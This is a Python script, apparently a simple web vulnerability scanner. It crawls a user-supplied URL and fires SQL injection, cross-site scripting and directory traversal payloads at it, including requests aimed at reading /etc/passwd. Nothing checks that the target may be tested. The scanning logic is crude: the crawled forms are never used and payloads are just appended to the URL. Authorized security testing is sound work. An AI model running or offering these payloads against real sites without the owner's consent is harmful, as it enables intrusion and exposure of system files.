import requests
from bs4 import BeautifulSoup
import re
import urllib.parse

# Helper function to check if URL is valid
def is_valid_url(url):
    parsed_url = urllib.parse.urlparse(url)
    return all([parsed_url.scheme, parsed_url.netloc])

# Function to crawl the website and find input fields
def crawl_website(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            inputs = soup.find_all('input')
            return forms, inputs
        else:
            print(f"Error: Unable to access {url}")
            return None, None
    except Exception as e:
        print(f"Exception occurred: {e}")
        return None, None

# Basic SQL Injection testing function
def test_sql_injection(url, form=None, input_field=None):
    sql_payloads = ["' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT NULL, NULL --"]
    results = []

    for payload in sql_payloads:
        # Inject payload into the URL or input field and check response
        injected_url = url + payload
        response = requests.get(injected_url)
        
        # Simple heuristic: if the page contains a common SQL error, it's vulnerable
        if any(error in response.text for error in ["mysql", "syntax", "sql"]):
            results.append(f"SQL Injection vulnerability detected with payload: {payload}")
    
    return results

# Basic XSS testing function
def test_xss(url, form=None, input_field=None):
    xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    results = []

    for payload in xss_payloads:
        # Inject payload into the URL or input field and check response
        injected_url = url + payload
        response = requests.get(injected_url)
        
        # Simple heuristic: if the payload appears in the response unescaped
        if payload in response.text:
            results.append(f"XSS vulnerability detected with payload: {payload}")
    
    return results

# Directory Traversal testing function
def test_directory_traversal(url):
    traversal_payloads = ["../../etc/passwd", "../../../../etc/passwd"]
    results = []

    for payload in traversal_payloads:
        injected_url = url + payload
        response = requests.get(injected_url)
        
        if "root:x:" in response.text:
            results.append(f"Directory Traversal vulnerability detected with payload: {payload}")
    
    return results

# Main function
def main():
    url = input("Enter the website URL: ")
    
    if not is_valid_url(url):
        print("Invalid URL. Please try again.")
        return
    
    print(f"Scanning {url} for vulnerabilities...")
    
    # Crawl the website for forms and inputs
    forms, inputs = crawl_website(url)
    
    if forms is None or inputs is None:
        print("Failed to crawl the website.")
        return
    
    # Testing for SQL Injection
    sql_injection_results = test_sql_injection(url)
    for result in sql_injection_results:
        print(result)
    
    # Testing for XSS
    xss_results = test_xss(url)
    for result in xss_results:
        print(result)
    
    # Testing for Directory Traversal
    traversal_results = test_directory_traversal(url)
    for result in traversal_results:
        print(result)

if __name__ == "__main__":
    main()
